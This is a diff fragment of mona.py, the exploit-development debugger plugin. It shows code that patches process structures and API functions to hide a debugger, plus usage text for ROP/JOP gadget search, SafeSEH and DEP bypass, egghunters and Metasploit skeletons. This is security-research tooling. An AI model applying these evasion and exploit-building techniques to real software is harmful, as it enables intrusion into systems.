+					dbg.log("[+] Wrote %d times \\x%s to chunk at 0x%08x" % (written,bin2hex(fillbyte),addy))
+			return
+
+
+		def procHideDebug(args):
+			peb = dbg.getPEBAddress()			
+			dbg.log("[+] Patching PEB (0x%08x)" % peb)
+			if peb == 0:
+				dbg.log("** Unable to find PEB **")
+				return
+
+			isdebugged = struct.unpack('<B',dbg.readMemory(peb + 0x02,1))[0]
+			processheapflag = dbg.readLong(peb + 0x18)
+			processheapflag += 0x10
+			processheapvalue = dbg.readLong(processheapflag)
+			ntglobalflag = dbg.readLong(peb + 0x68)
+
+			dbg.log("    Patching PEB.IsDebugged       : 0x%x -> 0x%x" % (isdebugged,0))
+			dbg.writeMemory(peb + 0x02, '\x00')
+			
+			dbg.log("    Patching PEB.ProcessHeap.Flag : 0x%x -> 0x%x" % (processheapvalue,0))
+			dbg.writeLong(processheapflag,0)
+			
+			dbg.log("    Patching PEB.NtGlobalFlag     : 0x%x -> 0x%x" % (ntglobalflag,0))
+			dbg.writeLong(peb + 0x68, 0)
+			
+			dbg.log("    Patching PEB.LDR_DATA Fill pattern")
+			a = dbg.readLong(peb + 0xc)
+			while a != 0:
+				a += 1
+				try:
+					b = dbg.readLong(a)
+					c = dbg.readLong(a + 4)
+					if (b == 0xFEEEFEEE) and (c == 0xFEEEFEEE):
+						dbg.writeLong(a,0)
+						dbg.writeLong(a + 4,0)
+						a += 7
+				except:
+					break
+
+			uef = dbg.getAddress("kernel32.UnhandledExceptionFilter")
+			if uef > 0:
+				dbg.log("[+] Patching kernel32.UnhandledExceptionFilter (0x%08x)" % uef)
+				uef += 0x86
+				dbg.writeMemory(uef, dbg.assemble(" \
+					PUSH EDI \
+				"))
+			else:
+				dbg.log("[-] Failed to hook kernel32.UnhandledExceptionFilter (0x%08x)")
+
+			remdebpres = dbg.getAddress("kernel32.CheckRemoteDebuggerPresent")
+			if remdebpres > 0:
+				dbg.log("[+] Patching CheckRemoteDebuggerPresent (0x%08x)" % remdebpres)
+				dbg.writeMemory( remdebpres, dbg.assemble( " \
+					MOV   EDI, EDI                                    \n \
+					PUSH EBP                                         \n \
+					MOV  EBP, ESP                                    \n \
+					MOV   EAX, [EBP + C]                              \n \
+					PUSH  0                                           \n \
+					POP   [EAX]                                       \n \
+					XOR   EAX, EAX                                    \n \
+					POP   EBP                                         \n \
+					RET   8                                           \
+				" ) )
+			else:
+				dbg.log("[-] Unable to patch CheckRemoteDebuggerPresent")
+
+			gtc = dbg.getAddress("kernel32.GetTickCount")
+			if gtc > 0:
+				dbg.log("[+] Patching GetTickCount (0x%08x)" % gtc)
+				patch = dbg.assemble("MOV EDX, 0x7FFE0000") + Poly_ReturnDW(0x0BADF00D) + dbg.assemble("Ret")
+				while len(patch) > 0x0F:
+					patch = dbg.assemble("MOV EDX, 0x7FFE0000") + Poly_ReturnDW(0x0BADF00D) + dbg.assemble("Ret")
+				dbg.writeMemory( gtc, patch )
+			else:
+				dbg.log("[-] Unable to pach GetTickCount")
+
+			zwq = dbg.getAddress("ntdll.ZwQuerySystemInformation")
+			if zwq > 0:
+				dbg.log("[+] Patching ZwQuerySystemInformation (0x%08x)" % zwq)
+				isPatched = False
+				a = 0
+				s = 0
+				while a < 3:
+					a += 1
+					s += dbg.disasmSizeOnly(zwq + s).opsize
+				FakeCode = dbg.readMemory(zwq, 1) + "\x78\x56\x34\x12" + dbg.readMemory(zwq + 5, 1)
+				if FakeCode == dbg.assemble("PUSH 0x12345678\nRET"):
+					isPatched = True
+					a = dbg.readLong(zwq+1)
+					i = 0
+					s = 0
+					while i < 3:
+						i += 1
+						s += dbg.disasmSizeOnly(a+s).opsize
+
+				if isPatched:
+					dbg.log("    Function was already patched.")
+				else:
+					a = dbg.remoteVirtualAlloc(size=0x1000)
+					if a > 0:
+						dbg.log("    Writing instructions to 0x%08x" % a)
+						dbg.writeMemory(a, dbg.readMemory(zwq,s))
+						pushCode = dbg.assemble("PUSH 0x%08x" % (zwq + s))
+						patchCode = "\x83\x7c\x24\x08\x07"	# CMP [ESP+8],7
+						patchCode += "\x74\x06"	
+						patchCode += pushCode
+						patchCode += "\xC3"					# RETN
+						patchCode += "\x8B\x44\x24\x0c"		# MOV EAX,[ESP+0x0c]
+						patchCode += "\x6a\x00"				# PUSH 0
+						patchCode += "\x8f\x00"				# POP [EAX]
+						patchCode += "\x33\xC0"				# XOR EAX,EAX
+						patchCode += "\xC2\x14\x00"			# RETN 14
+						dbg.writeMemory( a + s, patchCode)
+						# redirect function
+						dbg.writeMemory( zwq, dbg.assemble( "PUSH 0x%08X\nRET" % a) )
+
+					else:
+						dbg.log("    ** Unable to allocate memory in target process **")
+
+			else:
+				dbg.log("[-] Unable to patch ZwQuerySystemInformation")
+
+			return			
+
+
+		# ----- Finally, some main stuff ----- #
+		
+		# All available commands and their Usage :
+		
+		sehUsage = """Default module criteria : non safeseh, non aslr, non rebase
 This function will retrieve all stackpivot pointers that will bring you back to nseh in a seh overwrite exploit
 Optional argument: 
     -all : also search outside of loaded modules"""
@@ -17867,9 +18669,11 @@ Optional parameters :
     -end <instruction(s)> : specify one or more instructions that will be used as chain end. 
                                (Separate instructions with #). Default ending is RETN
     -f \"file1,file2,..filen\" : use mona generated rop files as input instead of searching in memory
-    -rva : use RVA's in rop chain"""
-    
-        jopUsage="""Default module criteria : non aslr,non rebase,non os
+    -rva : use RVA's in rop chain
+    -s <technique> : only create a ROP chain for the selected technique (options: virtualalloc, virtualprotect)    
+    -sort : sort the output in rop.txt (sort on pointer value)"""
+	
+		jopUsage="""Default module criteria : non aslr,non rebase,non os
 Optional parameters : 
     -depth <value> : define the maximum nr of instructions (not ending instruction) in each gadget (integer, default : 8)"""    
                                
@@ -17965,18 +18769,34 @@ Mandatory arguments :
 Optional arguments:
     -n <size> : the number of bytes to copy (size of the buffer)
     -e <address> : the end address of the copy"""
-    
-        compareUsage = """Compares contents of a binary file with locations in memory.
+	
+# 		compareUsage = """Compares contents of a binary file with locations in memory.
+# Mandatory argument :
+#     -f <filename> : full path to binary file
+# Optional argument :
+#     -a <address> : the exact address of the bytes in memory (address or register). 
+#                    If you don't specify an address, I will try to locate the bytes in memory 
+#                    by looking at the first 8 bytes.
+#     -s : skip locations that belong to a module
+#     -unicode : perform unicode search. Note: input should *not* be unicode, it will be expanded automatically"""
+
+
+		compareUsage = """Compare a file created by mona's bytearray/msfvenom/gdb/hex/xxd/hexdump/ollydbg with a copy in memory.
 Mandatory argument :
-    -f <filename> : full path to binary file
+    -f <filename> : full path to input file
 Optional argument :
     -a <address> : the exact address of the bytes in memory (address or register). 
                    If you don't specify an address, I will try to locate the bytes in memory 
                    by looking at the first 8 bytes.
     -s : skip locations that belong to a module
-    -unicode : perform unicode search. Note: input should *not* be unicode, it will be expanded automatically"""
-                   
-        offsetUsage = """Calculate the number of bytes between two addresses. You can use 
+    -unicode : perform unicode search. Note: input should *not* be unicode, it will be expanded automatically
+	-t : input file type format. If no file type format is specified, I will try to guess the input file type format.
+		 
+		 Available formats:
+		'raw', 'hexdump', 'js-unicode', 'dword', 'xxd', 'byte-array', 'hexstring', 'hexdump-C', 'classic-hexdump', 'escaped-hexes', 'msfvenom-powershell', 'gdb', 'ollydbg', 'msfvenom-ruby', 'msfvenom-c', 'msfvenom-carray', 'msfvenom-python'
+	"""
+
+		offsetUsage = """Calculate the number of bytes between two addresses. You can use 
 registers instead of addresses. 
 Mandatory arguments :
     -a1 <address> : the first address/register
@@ -18019,6 +18839,10 @@ Optional arguments :
     -cpb <bytes> : bytes to exclude from the array. Example : '\\x00\\x0a\\x0d'
                    Note: you can specify wildcards using .. 
                    Example: '\\x00\\x0a..\\x20\\x32\\x7f..\\xff'
+    -s : optional starting hex, example: '\\x7f'
+    -e : optional ending hex, example: '\\xff'
+         Example: -s \\x01 -e \\x7f to have all bytes from 0x01 to 0x7f
+                  -s \\xff -e \\x7f to have all bytes from 0xff to 0x7f in reverse
     -r : show array backwards (reversed), starting at \\xff
     Output will be written to bytearray.txt, and binary output will be written to bytearray.bin"""
     
@@ -18027,11 +18851,9 @@ Mandatory argument :
     -f <filename> : source filename
 Optional argument:
     -t <type>     : specify type of output. Valid choices are 'ruby' (default) or 'python' """
-    
-        updateUsage = """Update mona to the latest version
-Optional argument : 
-    -http : Use http instead of https"""
-        getpcUsage = """Find getpc routine for specific register
+	
+		updateUsage = """Update mona to the latest version"""
+		getpcUsage = """Find getpc routine for specific register
 Mandatory argument :
     -r : register (ex: eax)"""
 
@@ -18041,7 +18863,9 @@ Optional arguments :
     -c : enable checksum routine. Only works in conjunction with parameter -f
     -f <filename> : file containing the shellcode
     -startreg <reg> : start searching at the address pointed by this reg
-    -wow64 : generate wow64 egghunter. Default is traditional 32bit egghunter
+    -wow64 : generate wow64 egghunter (Win7 and Win10). Default is traditional 32bit egghunter
+    -winver <ver> : indicate Windows version for wow64 egghunter. Default is Windows 10. 
+                    valid values are 7 and 10.	
 DEP Bypass options :
     -depmethod <method> : method can be "virtualprotect", "copy" or "copy_size"
     -depreg <reg> : sets the register that contains a pointer to the API function to bypass DEP. 
@@ -18191,7 +19015,12 @@ Output will be written to infodump.xml"""
 
         tebUsage = """Show the address of the Thread Environment Block (TEB) for the current thread"""
 
-        encUsage = """Encode a series of bytes
+		jsehUsage = """(look for jmp/call dword ptr[ebp/esp+nn and ebp-nn] + add esp,8+ret) 
+Only addresses outside address range of modules will be listed unless parameter '-all' is given. 
+In that case, all addresses will be listed. TRY THIS ONE !"""
+		
+		
+		encUsage = """Encode a series of bytes
 Arguments:
     -t <type>         : Type of encoder to use.  Allowed value(s) are alphanum 
     -s <bytes>        : The bytes to encode (or use -f instead)
@@ -18246,7 +19075,9 @@ Arguments:
     -f <path/to/logfile> : Full path to the logfile
 Optional arguments:
     -l <number>       : Recursively dump objects
-    -m <number>       : Size for recursive objects (default value: 0x28)""" 
+    -m <number>       : Size for recursive objects (default value: 0x28)
+    -s <number>       : Only take allocated chunks of this exact size into consideration
+    -nofree           : Ignore all free() events, show all allocations (including those that were freed)""" 
 
         tobpUsage = """Generate WinDBG syntax to set a logging breakpoint at a given location
 Arguments:
@@ -18279,74 +19110,76 @@ Arguments:
     -diff     : compare current state with previously saved state""" 
 
 
-        commands["seh"]             = MnCommand("seh", "Find pointers to assist with SEH overwrite exploits",sehUsage, procFindSEH)
-        commands["config"]          = MnCommand("config","Manage configuration file (mona.ini)",configUsage,procConfig,"conf")
-        commands["jmp"]             = MnCommand("jmp","Find pointers that will allow you to jump to a register",jmpUsage,procFindJMP, "j")
-        commands["ropfunc"]         = MnCommand("ropfunc","Find pointers to pointers (IAT) to interesting functions that can be used in your ROP chain",ropfuncUsage,procFindROPFUNC)
-        commands["rop"]             = MnCommand("rop","Finds gadgets that can be used in a ROP exploit and do ROP magic with them",ropUsage,procROP)
-        commands["jop"]             = MnCommand("jop","Finds gadgets that can be used in a JOP exploit",jopUsage,procJOP)       
-        commands["stackpivot"]      = MnCommand("stackpivot","Finds stackpivots (move stackpointer to controlled area)",stackpivotUsage,procStackPivots)
-        commands["modules"]         = MnCommand("modules","Show all loaded modules and their properties",modulesUsage,procShowMODULES,"mod")
-        commands["filecompare"]     = MnCommand("filecompare","Compares 2 or more files created by mona using the same output commands",filecompareUsage,procFileCOMPARE,"fc")
-        commands["pattern_create"]  = MnCommand("pattern_create","Create a cyclic pattern of a given size",patcreateUsage,procCreatePATTERN,"pc")
-        commands["pattern_offset"]  = MnCommand("pattern_offset","Find location of 4 bytes in a cyclic pattern",patoffsetUsage,procOffsetPATTERN,"po")
-        commands["find"]            = MnCommand("find", "Find bytes in memory", findUsage, procFind,"f")
-        commands["findwild"]        = MnCommand("findwild", "Find instructions in memory, accepts wildcards", findwildUsage, procFindWild,"fw")
-        commands["assemble"]        = MnCommand("assemble", "Convert instructions to opcode. Separate multiple instructions with #",assembleUsage,procAssemble,"asm")
-        commands["info"]            = MnCommand("info", "Show information about a given address in the context of the loaded application",infoUsage,procInfo)
-        commands["dump"]            = MnCommand("dump", "Dump the specified range of memory to a file", dumpUsage,procDump)
-        commands["offset"]          = MnCommand("offset", "Calculate the number of bytes between two addresses", offsetUsage, procOffset)       
-        commands["compare"]         = MnCommand("compare","Compare contents of a binary file with a copy in memory", compareUsage, procCompare,"cmp")
-        commands["breakpoint"]      = MnCommand("bp","Set a memory breakpoint on read/write or execute of a given address", bpUsage, procBp,"bp")
-        commands["nosafeseh"]       = MnCommand("nosafeseh", "Show modules that are not safeseh protected", nosafesehUsage, procModInfoS)
-        commands["nosafesehaslr"]   = MnCommand("nosafesehaslr", "Show modules that are not safeseh protected, not aslr and not rebased", nosafesehaslrUsage, procModInfoSA)        
-        commands["noaslr"]          = MnCommand("noaslr", "Show modules that are not aslr or rebased", noaslrUsage, procModInfoA)
-        commands["findmsp"]         = MnCommand("findmsp","Find cyclic pattern in memory", findmspUsage,procFindMSP,"findmsf")
-        commands["suggest"]         = MnCommand("suggest","Suggest an exploit buffer structure", suggestUsage,procSuggest)
-        commands["bytearray"]       = MnCommand("bytearray","Creates a byte array, can be used to find bad characters",bytearrayUsage,procByteArray,"ba")
-        commands["header"]          = MnCommand("header","Read a binary file and convert content to a nice 'header' string",headerUsage,procPrintHeader)
-        commands["update"]          = MnCommand("update","Update mona to the latest version",updateUsage,procUpdate,"up")
-        commands["getpc"]           = MnCommand("getpc","Show getpc routines for specific registers",getpcUsage,procgetPC)  
-        commands["egghunter"]       = MnCommand("egghunter","Create egghunter code",eggUsage,procEgg,"egg")
-        commands["stacks"]          = MnCommand("stacks","Show all stacks for all threads in the running application",stacksUsage,procStacks)
-        commands["skeleton"]        = MnCommand("skeleton","Create a Metasploit module skeleton with a cyclic pattern for a given type of exploit",skeletonUsage,procSkeleton)
-        commands["breakfunc"]       = MnCommand("breakfunc","Set a breakpoint on an exported function in on or more dll's",bfUsage,procBf,"bf")
-        commands["heap"]            = MnCommand("heap","Show heap related information",heapUsage,procHeap)
-        commands["getiat"]          = MnCommand("getiat","Show IAT of selected module(s)",getiatUsage,procGetIAT,"iat")
-        commands["geteat"]          = MnCommand("geteat","Show EAT of selected module(s)",geteatUsage,procGetEAT,"eat")
-        commands["pageacl"]         = MnCommand("pageacl","Show ACL associated with mapped pages",getpageACLUsage,procPageACL,"pacl")
-        commands["bpseh"]           = MnCommand("bpseh","Set a breakpoint on all current SEH Handler function pointers",bpsehUsage,procBPSeh,"sehbp")
-        commands["kb"]              = MnCommand("kb","Manage Knowledgebase data",kbUsage,procKb,"kb")
-        commands["encode"]          = MnCommand("encode","Encode a series of bytes",encUsage,procEnc,"enc")
-        commands["unicodealign"]    = MnCommand("unicodealign","Generate venetian alignment code for unicode stack buffer overflow",unicodealignUsage,procUnicodeAlign,"ua")
-        #commands["heapcookie"]      = MnCommand("heapcookie","Looks for writeable pointers that can help avoiding cookie check during arbitrary free",heapCookieUsage,procHeapCookie,"hc")
-        if __DEBUGGERAPP__ == "Immunity Debugger" or __DEBUGGERAPP__ == 'x64dbg':
-            commands["deferbp"]     = MnCommand("deferbp","Set a deferred breakpoint",deferUsage,procBu,"bu")
-            commands["calltrace"]   = MnCommand("calltrace","Log all CALL instructions",calltraceUsage,procCallTrace,"ct")
-        if __DEBUGGERAPP__ == "WinDBG":
-            commands["fillchunk"]   = MnCommand("fillchunk","Fill a heap chunk referenced by a register",fillchunkUsage,procFillChunk,"fchunk")
-            commands["dumpobj"]     = MnCommand("dumpobj","Dump the contents of an object",dumpobjUsage,procDumpObj,"do")
-            commands["dumplog"]     = MnCommand("dumplog","Dump objects present in alloc/free log file",dumplogUsage,procDumpLog,"dl")
-            commands["changeacl"]   = MnCommand("changeacl","Change the ACL of a given page",changeaclUsage,procChangeACL,"ca")
-            commands["allocmem"]    = MnCommand("allocmem","Allocate some memory in the process",allocmemUsage,procAllocMem,"alloc")
-            commands["tobp"]        = MnCommand("tobp","Generate WinDBG syntax to create a logging breakpoint at given location",tobpUsage,procToBp,"2bp")
-            commands["flow"]        = MnCommand("flow","Simulate execution flows, including all branch combinations",flowUsage,procFlow,"flw")
-            #commands["diffheap"]   = MnCommand("diffheap", "Compare current heap layout with previously saved state", diffheapUsage, procDiffHeap, "dh")
-        commands["fwptr"]           = MnCommand("fwptr", "Find Writeable Pointers that get called", fwptrUsage, procFwptr, "fwp")
-        commands["sehchain"]        = MnCommand("sehchain","Show the current SEH chain",sehchainUsage,procSehChain,"exchain")
-        commands["hidedebug"]       = MnCommand("hidedebug","Attempt to hide the debugger",hidedebugUsage,procHideDebug,"hd")
-        commands["gflags"]          = MnCommand("gflags", "Show current GFlags settings from PEB.NtGlobalFlag", gflagsUsage, procFlags, "gf")
-        commands["infodump"]        = MnCommand("infodump","Dumps specific parts of memory to file", infodumpUsage, procInfoDump,"if")
-        commands["peb"]             = MnCommand("peb","Show location of the PEB",pebUsage,procPEB,"peb")
-        commands["teb"]             = MnCommand("teb","Show TEB related information",tebUsage,procTEB,"teb")
-        commands["string"]          = MnCommand("string","Read or write a string from/to memory",stringUsage,procString,"str")
-        commands["copy"]            = MnCommand("copy","Copy bytes from one location to another",copyUsage,procCopy,"cp")
-        commands["?"]               = MnCommand("?","Evaluate an expression",evalUsage,procEval,"eval")
-        # get the options
-        opts = {}
-        last = ""
-        arguments = []
-        argcopy = copy.copy(args)
+		commands["seh"] 			= MnCommand("seh", "Find pointers to assist with SEH overwrite exploits",sehUsage, procFindSEH)
+		commands["config"] 			= MnCommand("config","Manage configuration file (mona.ini)",configUsage,procConfig,"conf")
+		commands["jmp"]				= MnCommand("jmp","Find pointers that will allow you to jump to a register",jmpUsage,procFindJMP, "j")
+		commands["ropfunc"] 		= MnCommand("ropfunc","Find pointers to pointers (IAT) to interesting functions that can be used in your ROP chain",ropfuncUsage,procFindROPFUNC)
+		commands["rop"] 			= MnCommand("rop","Finds gadgets that can be used in a ROP exploit and do ROP magic with them",ropUsage,procROP)
+		commands["jop"] 			= MnCommand("jop","Finds gadgets that can be used in a JOP exploit",jopUsage,procJOP)		
+		commands["jseh"]			= MnCommand("jseh", "Finds gadgets that can be used to bypass SafeSEH", jsehUsage, procJseh)
+		commands["stackpivot"]		= MnCommand("stackpivot","Finds stackpivots (move stackpointer to controlled area)",stackpivotUsage,procStackPivots)
+		commands["modules"] 		= MnCommand("modules","Show all loaded modules and their properties",modulesUsage,procShowMODULES,"mod")
+		commands["filecompare"]		= MnCommand("filecompare","Compares 2 or more files created by mona using the same output commands",filecompareUsage,procFileCOMPARE,"fc")
+		commands["pattern_create"]	= MnCommand("pattern_create","Create a cyclic pattern of a given size",patcreateUsage,procCreatePATTERN,"pc")
+		commands["pattern_offset"]	= MnCommand("pattern_offset","Find location of 4 bytes in a cyclic pattern",patoffsetUsage,procOffsetPATTERN,"po")
+		commands["find"] 			= MnCommand("find", "Find bytes in memory", findUsage, procFind,"f")
+		commands["findwild"]		= MnCommand("findwild", "Find instructions in memory, accepts wildcards", findwildUsage, procFindWild,"fw")
+		commands["assemble"] 		= MnCommand("assemble", "Convert instructions to opcode. Separate multiple instructions with #",assembleUsage,procAssemble,"asm")
+		commands["info"] 			= MnCommand("info", "Show information about a given address in the context of the loaded application",infoUsage,procInfo)
+		commands["dump"] 			= MnCommand("dump", "Dump the specified range of memory to a file", dumpUsage,procDump)
+		commands["offset"]          = MnCommand("offset", "Calculate the number of bytes between two addresses", offsetUsage, procOffset)		
+		#commands["compare"]			= MnCommand("compare","Compare contents of a binary file with a copy in memory", compareUsage, procCompare,"cmp")
+		commands["compare"]			= MnCommand("compare","Compare a file created by msfvenom/gdb/hex/xxd/hexdump/ollydbg with a copy in memory", compareUsage, procCompare,"cmp")
+		commands["breakpoint"]		= MnCommand("bp","Set a memory breakpoint on read/write or execute of a given address", bpUsage, procBp,"bp")
+		commands["nosafeseh"]		= MnCommand("nosafeseh", "Show modules that are not safeseh protected", nosafesehUsage, procModInfoS)
+		commands["nosafesehaslr"]	= MnCommand("nosafesehaslr", "Show modules that are not safeseh protected, not aslr and not rebased", nosafesehaslrUsage, procModInfoSA)		
+		commands["noaslr"]			= MnCommand("noaslr", "Show modules that are not aslr or rebased", noaslrUsage, procModInfoA)
+		commands["findmsp"]			= MnCommand("findmsp","Find cyclic pattern in memory", findmspUsage,procFindMSP,"findmsf")
+		commands["suggest"]			= MnCommand("suggest","Suggest an exploit buffer structure", suggestUsage,procSuggest)
+		commands["bytearray"]		= MnCommand("bytearray","Creates a byte array, can be used to find bad characters",bytearrayUsage,procByteArray,"ba")
+		commands["header"]			= MnCommand("header","Read a binary file and convert content to a nice 'header' string",headerUsage,procPrintHeader)
+		commands["update"]			= MnCommand("update","Update mona to the latest version",updateUsage,procUpdate,"up")
+		commands["getpc"]			= MnCommand("getpc","Show getpc routines for specific registers",getpcUsage,procgetPC)	
+		commands["egghunter"]		= MnCommand("egghunter","Create egghunter code",eggUsage,procEgg,"egg")
+		commands["stacks"]			= MnCommand("stacks","Show all stacks for all threads in the running application",stacksUsage,procStacks)
+		commands["skeleton"]		= MnCommand("skeleton","Create a Metasploit module skeleton with a cyclic pattern for a given type of exploit",skeletonUsage,procSkeleton)
+		commands["breakfunc"]		= MnCommand("breakfunc","Set a breakpoint on an exported function in on or more dll's",bfUsage,procBf,"bf")
+		commands["heap"]			= MnCommand("heap","Show heap related information",heapUsage,procHeap)
+		commands["getiat"]			= MnCommand("getiat","Show IAT of selected module(s)",getiatUsage,procGetIAT,"iat")
+		commands["geteat"]          = MnCommand("geteat","Show EAT of selected module(s)",geteatUsage,procGetEAT,"eat")
+		commands["pageacl"]         = MnCommand("pageacl","Show ACL associated with mapped pages",getpageACLUsage,procPageACL,"pacl")
+		commands["bpseh"]           = MnCommand("bpseh","Set a breakpoint on all current SEH Handler function pointers",bpsehUsage,procBPSeh,"sehbp")
+		commands["kb"]				= MnCommand("kb","Manage Knowledgebase data",kbUsage,procKb,"kb")
+		commands["encode"]			= MnCommand("encode","Encode a series of bytes",encUsage,procEnc,"enc")
+		commands["unicodealign"]	= MnCommand("unicodealign","Generate venetian alignment code for unicode stack buffer overflow",unicodealignUsage,procUnicodeAlign,"ua")
+		#commands["heapcookie"]      = MnCommand("heapcookie","Looks for writeable pointers that can help avoiding cookie check during arbitrary free",heapCookieUsage,procHeapCookie,"hc")
+		if __DEBUGGERAPP__ == "Immunity Debugger":
+			commands["deferbp"]		= MnCommand("deferbp","Set a deferred breakpoint",deferUsage,procBu,"bu")
+			commands["calltrace"]	= MnCommand("calltrace","Log all CALL instructions",calltraceUsage,procCallTrace,"ct")
+		if __DEBUGGERAPP__ == "WinDBG":
+			commands["fillchunk"]	= MnCommand("fillchunk","Fill a heap chunk referenced by a register",fillchunkUsage,procFillChunk,"fchunk")
+			commands["dumpobj"]		= MnCommand("dumpobj","Dump the contents of an object",dumpobjUsage,procDumpObj,"do")
+			commands["dumplog"]     = MnCommand("dumplog","Dump objects present in alloc/free log file",dumplogUsage,procDumpLog,"dl")
+			commands["changeacl"]   = MnCommand("changeacl","Change the ACL of a given page",changeaclUsage,procChangeACL,"ca")
+			commands["allocmem"]	= MnCommand("allocmem","Allocate some memory in the process",allocmemUsage,procAllocMem,"alloc")
+			commands["tobp"]		= MnCommand("tobp","Generate WinDBG syntax to create a logging breakpoint at given location",tobpUsage,procToBp,"2bp")
+			commands["flow"]		= MnCommand("flow","Simulate execution flows, including all branch combinations",flowUsage,procFlow,"flw")
+			#commands["diffheap"]	= MnCommand("diffheap", "Compare current heap layout with previously saved state", diffheapUsage, procDiffHeap, "dh")
+		commands["fwptr"]			= MnCommand("fwptr", "Find Writeable Pointers that get called", fwptrUsage, procFwptr, "fwp")
+		commands["sehchain"]		= MnCommand("sehchain","Show the current SEH chain",sehchainUsage,procSehChain,"exchain")
+		commands["hidedebug"]		= MnCommand("hidedebug","Attempt to hide the debugger",hidedebugUsage,procHideDebug,"hd")
+		commands["gflags"]			= MnCommand("gflags", "Show current GFlags settings from PEB.NtGlobalFlag", gflagsUsage, procFlags, "gf")
+		commands["infodump"]		= MnCommand("infodump","Dumps specific parts of memory to file", infodumpUsage, procInfoDump,"if")
+		commands["peb"]				= MnCommand("peb","Show location of the PEB",pebUsage,procPEB,"peb")
+		commands["teb"]				= MnCommand("teb","Show TEB related information",tebUsage,procTEB,"teb")
+		commands["string"]			= MnCommand("string","Read or write a string from/to memory",stringUsage,procString,"str")
+		commands["copy"]			= MnCommand("copy","Copy bytes from one location to another",copyUsage,procCopy,"cp")
+		commands["?"]				= MnCommand("?","Evaluate an expression",evalUsage,procEval,"eval")
+		# get the options
+		opts = {}
+		last = ""
+		arguments = []
+		argcopy = copy.copy(args)
 
         aline = " ".join(a for a in argcopy)
         if __DEBUGGERAPP__ == "WinDBG":
